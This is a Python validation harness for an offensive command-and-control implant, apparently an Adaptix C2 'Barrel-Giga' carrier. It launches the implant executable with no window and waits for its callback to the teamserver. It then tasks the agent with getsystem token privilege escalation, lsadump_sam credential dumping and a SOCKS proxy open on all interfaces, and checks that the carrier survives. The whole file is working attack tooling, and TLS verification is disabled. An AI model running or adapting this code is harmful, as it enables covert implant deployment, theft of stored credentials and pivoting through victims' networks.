from __future__ import annotations

import argparse
import json
import os
import ssl
import subprocess
import time
import urllib.request
from dataclasses import dataclass
from pathlib import Path
from typing import Any


@dataclass(frozen=True)
class Command:
    name: str
    cmdline: str
    data: dict[str, Any]
    result_mode: str = "console"


COMMANDS = (
    Command("ls", "ls .", {"command": "ls", "path": "."}),
    Command("sleep", "sleep 0", {"command": "sleep", "sleep": "0"}),
    Command(
        "getsystem",
        "getsystem token",
        {"command": "getsystem", "subcommand": "token"},
    ),
    Command("lsadump_sam", "lsadump_sam", {"command": "lsadump_sam"}),
    Command("rev2self", "rev2self", {"command": "rev2self"}),
    Command(
        "socks_start",
        "socks start 1080",
        {
            "command": "socks",
            "subcommand": "start",
            "port": 1080,
            "address": "0.0.0.0",
        },
        "task",
    ),
    Command(
        "socks_stop",
        "socks stop 1080",
        {"command": "socks", "subcommand": "stop", "port": 1080},
        "task",
    ),
)


class ValidationError(RuntimeError):
    pass


class AdaptixClient:
    def __init__(self, host: str, username: str, password: str):
        endpoint = host.rstrip("/")
        if not endpoint.endswith("/endpoint"):
            endpoint += "/endpoint"
        self.endpoint = endpoint
        self.context = ssl._create_unverified_context()
        response = self.request(
            "/login",
            method="POST",
            payload={"username": username, "password": password},
            authenticated=False,
        )
        self.token = str(response["access_token"])

    def request(
        self,
        path: str,
        *,
        method: str = "GET",
        payload: dict[str, Any] | None = None,
        authenticated: bool = True,
    ) -> Any:
        data = None
        headers = {"Content-Type": "application/json"}
        if payload is not None:
            data = json.dumps(payload, separators=(",", ":")).encode("utf-8")
        if authenticated:
            headers["Authorization"] = f"Bearer {self.token}"
        request = urllib.request.Request(
            self.endpoint + path,
            data=data,
            headers=headers,
            method=method,
        )
        with urllib.request.urlopen(
            request, timeout=30, context=self.context
        ) as response:
            body = response.read()
        return json.loads(body) if body else None

    def agents(self) -> list[dict[str, Any]]:
        value = self.request("/agent/list")
        return list(value or [])

    def console(self, agent_id: int) -> list[dict[str, Any]]:
        value = self.request(f"/agent/console/list?agent_id={agent_id}")
        return list((value or {}).get("items") or [])

    def execute(self, agent_id: int, command: Command) -> None:
        response = self.request(
            "/agent/command/execute",
            method="POST",
            payload={
                "id": agent_id,
                "cmdline": command.cmdline,
                "data": json.dumps(command.data, separators=(",", ":")),
            },
        )
        if not response or response.get("ok") is not True:
            raise ValidationError(f"{command.name}: task submission failed")


def _integer(value: Any, default: int = -1) -> int:
    try:
        return int(value)
    except (TypeError, ValueError):
        return default


def _command_statuses(items: list[dict[str, Any]]) -> dict[str, bool]:
    tasks: dict[int, list[dict[str, Any]]] = {}
    for item in items:
        tasks.setdefault(_integer(item.get("a_task_id")), []).append(item)

    by_cmdline: dict[str, list[dict[str, Any]]] = {}
    for rows in tasks.values():
        cmdline = next(
            (str(row.get("a_cmdline")) for row in rows if row.get("a_cmdline")),
            None,
        )
        if cmdline:
            by_cmdline[cmdline] = rows

    statuses: dict[str, bool] = {}
    for command in COMMANDS:
        rows = by_cmdline.get(command.cmdline, [])
        has_error = any(_integer(row.get("a_msg_type")) == 3 for row in rows)
        if command.result_mode == "console":
            succeeded = any(
                _integer(row.get("type")) == 107
                and _integer(row.get("a_msg_type")) == 7
                for row in rows
            )
        else:
            succeeded = any(
                _integer(row.get("type")) == 106
                and _integer(row.get("a_msg_type")) == 7
                for row in rows
            )
        statuses[command.name] = bool(rows) and succeeded and not has_error
    return statuses


def _wait_for_agent(
    client: AdaptixClient,
    baseline_ids: set[int],
    pid: int,
    process: subprocess.Popen[bytes],
    timeout: float,
) -> dict[str, Any]:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if process.poll() is not None:
            raise ValidationError(
                f"carrier exited before callback with code {process.returncode}"
            )
        for agent in client.agents():
            agent_id = _integer(agent.get("a_id"))
            if agent_id not in baseline_ids and _integer(agent.get("a_pid")) == pid:
                return agent
        time.sleep(1)
    raise ValidationError("callback timeout")


def validate(executable: Path, timeout: float) -> None:
    host = os.environ.get("AX_HOST")
    username = os.environ.get("AX_USER")
    password = os.environ.get("AX_PASS")
    if not host or not username or not password:
        raise ValidationError("set AX_HOST, AX_USER, and AX_PASS")

    executable = executable.resolve()
    if not executable.is_file():
        raise ValidationError(f"executable does not exist: {executable}")

    client = AdaptixClient(host, username, password)
    baseline_ids = {_integer(agent.get("a_id")) for agent in client.agents()}
    creation_flags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
    process = subprocess.Popen(
        [str(executable)],
        cwd=executable.parent,
        creationflags=creation_flags,
    )
    try:
        agent = _wait_for_agent(
            client, baseline_ids, process.pid, process, timeout
        )
        agent_id = _integer(agent.get("a_id"))
        if str(agent.get("a_process", "")).lower() != executable.name.lower():
            raise ValidationError("callback process identity does not match")
        print(f"callback: PASS agent={agent_id} pid={process.pid}")

        for command in COMMANDS:
            client.execute(agent_id, command)
            time.sleep(0.75)

        deadline = time.monotonic() + timeout
        statuses: dict[str, bool] = {}
        while time.monotonic() < deadline:
            if process.poll() is not None:
                raise ValidationError("carrier exited during command validation")
            statuses = _command_statuses(client.console(agent_id))
            if all(statuses.get(command.name) for command in COMMANDS):
                break
            time.sleep(1)
        else:
            failed = [
                command.name
                for command in COMMANDS
                if not statuses.get(command.name)
            ]
            raise ValidationError("command timeout: " + ", ".join(failed))

        for command in COMMANDS:
            print(f"{command.name}: PASS")
        if client.request("/tunnel/list") not in (None, [], ""):
            raise ValidationError("SOCKS tunnel remains after stop")
        current = next(
            (
                item
                for item in client.agents()
                if _integer(item.get("a_id")) == agent_id
            ),
            None,
        )
        if current is None or _integer(current.get("a_pid")) != process.pid:
            raise ValidationError("callback identity changed after commands")
        if process.poll() is not None:
            raise ValidationError("carrier did not survive the command suite")
        print("survival: PASS")
        print("tunnel_cleanup: PASS")
    finally:
        if process.poll() is None:
            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()
                process.wait(timeout=5)
        print(f"process_cleanup: PASS pid={process.pid}")


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Validate a Barrel-Giga callback without printing command output"
    )
    parser.add_argument("executable", type=Path)
    parser.add_argument("--timeout", type=float, default=30.0)
    args = parser.parse_args()
    try:
        validate(args.executable, args.timeout)
        return 0
    except (OSError, ValidationError, ValueError) as exc:
        print(f"error: {exc}")
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
